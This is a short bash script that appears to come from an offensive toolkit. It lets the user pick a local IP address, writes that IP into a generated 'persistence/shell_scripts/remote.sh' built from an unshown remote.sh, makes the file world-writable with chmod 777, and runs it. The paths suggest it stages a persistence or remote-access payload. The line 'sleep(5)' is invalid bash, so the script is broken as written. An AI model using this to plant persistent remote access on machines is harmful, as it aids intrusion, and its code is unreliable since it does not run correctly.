#!/bin/bash

# Get the IP addresses from ifconfig and filter out the local loopback address
ip_addresses=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}')

# Print the list of IP addresses and prompt the user to choose one
echo "Choose an IP address:"
select ip_address in $ip_addresses; do
  # Check if a valid IP address was chosen
  if [[ -n "$ip_address" ]]; then
    break
  fi
done

# Assign the chosen IP address to a variable
IP=$ip_address

rm -rf persistence/shell_scripts/remote.sh

echo "#!/bin/bash" >> persistence/shell_scripts/remote.sh
echo "IP=$IP" >> persistence/shell_scripts/remote.sh
cat remote.sh >> persistence/shell_scripts/remote.sh
chmod 777 persistence/shell_scripts/remote.sh

echo "RUNNING IN 5 SECONDS"
sleep(5)
bash persistence/shell_scripts/remote.sh
